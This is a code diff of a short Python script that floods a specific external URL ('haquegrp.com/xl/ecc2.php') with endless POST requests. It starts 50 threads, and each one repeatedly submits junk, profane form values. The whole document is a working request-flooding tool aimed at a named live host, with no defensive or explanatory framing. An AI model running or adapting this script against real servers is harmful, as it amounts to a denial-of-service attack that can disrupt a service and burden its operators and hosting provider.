@@ -1,14 +1,27 @@
+import threading
 import requests
 
-flag = True
+url = "https://haquegrp.com/xl/ecc2.php"
 
-url = ''
+data = {
+    "a": "fuckyou@fckU.com",
+    "az": "RIPBOZO"
+}
 
+def send_posts():
+    while True:
+        response = requests.post(url, data=data)
+        print(response.status_code)
 
-data = {}
+threads = []
 
+for i in range(50):
+    t = threading.Thread(target=send_posts)
+    t.daemon = True
+    threads.append(t)
 
-while flag:
-response = requests.post(url, data=data)
+for i in range(50):
+    threads[i].start()
 
-print(response.status_code)
+for i in range(50):
+    threads[i].join()
